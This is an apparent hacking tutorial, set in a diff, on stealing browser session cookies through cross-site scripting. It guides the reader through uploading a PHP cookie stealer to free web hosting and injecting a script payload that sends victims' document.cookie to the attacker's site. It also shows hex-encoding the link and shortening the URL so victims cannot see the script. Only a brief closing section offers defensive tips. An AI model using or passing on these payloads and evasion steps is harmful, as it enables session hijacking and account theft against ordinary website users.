@@ -1,0 +1,61 @@
+Step 1: Creating Cookie Stealer PHP file
+
+Get the Cookie stealer from the link i mentioned.  In that post, i have explained three versions of cookie stealer.  We are going to use the third version.
+
+    Copy the code.
+    Open Notepad and paste the code
+    Save the file with .php extension
+    Eg: Stealer.php
+
+Now create New file and save it as log.txt (leave it as blank). Don’t change the name , this is the file name what we give in php file.
+
+Now you will have two files;
+1. Stealer.php
+2. log.txt
+
+What these two files do exactly?
+The above Stealer.php file get ip address,cookie and stores the data in log.txt file.
+The log.txt has cookies , ip address details.
+
+Step 2:
+Register in a free web-hosting service and login into your cpanel.
+Now open the File Manager in cpanel.
+Upload the Stealer.php and log.txt to root folder or public_html folder.
+
+Now the stealer will be at hxxp://www.YourSite.com/Stealer.php .
+
+Step 3: Exploiting the XSS Vulnerability
+So Far , we have sharpened our saw.  Now we are going to use it.
+Once you set up everything and find a Vulnerable site,then inject the following code in the Vulnerable sites.
+
+    <script>location.href = ‘http://www.Yoursite.com/Stealer.php?cookie=’+document.cookie;</script>
+
+For example:
+hxxp://www.VulnerableSite.com/index.php?search=<script>location.href = ‘http://www.Yoursite.com/Stealer.php?cookie=’+document.cookie;</script>
+
+Cookie Stealing with Non-Persistent vs Persistent XSS:
+Persistent: if you inject this code in Persistent XSS vulnerable site, it will be there forever until admin find it.  It will be shown to all users.  So attackers don’t need to send any link to others.  Whoever visit the page, they will be vicim.
+
+Non-Persistent:
+In case of Non-persistent attack, attacker will send the link to victims. Whenever they follow the link, it will steal the cookie.  Most of sites are vulnerable to Non-persistent XSS .
+
+In Non-persistence, Attackers will send the injected link victims.
+For example:
+hxxp://www.VulnerableSite.com/index.php?search=<script>location.href = ‘http://www.Yoursite.com/Stealer.php?cookie=’+document.cookie;</script>
+
+The above link is clearly shows the scripts.  Hackers can Hex-encode this script  so that victim can’t see the script.
+For Example:
+
+    hxxp://www.VulnerableSite.com/index.php?search=%3c%73%63%72%69%70%74%3e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%20%3d%20%27%68%74%74%70%3a%2f%2f%77%77%77%2e%59%6f%75%72%73%69%74%65%2e%63%6f%6d%2f%53%74%65%61%6c%65%72%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
+
+Still , the link look long. The attacker use one more trick to hide the long url i.e url shortening sites. There are lot of sites that shorten the long url into tiny url.
+
+For example:
+hxxp://www.tinyexample.com/twrwd63
+
+Once the victim follow the link, his cookie will be stored in log.txt file.
+How to be Secure from this attack?
+
+    Use No-Script Addon. This is best protection to stay away from XSS
+    Never Click the Shorten url
+    Sometime you may want to follow the shorten link.  If so, then clear all cookies in your browser and visit through Proxy or VPN(it will hide your ip)
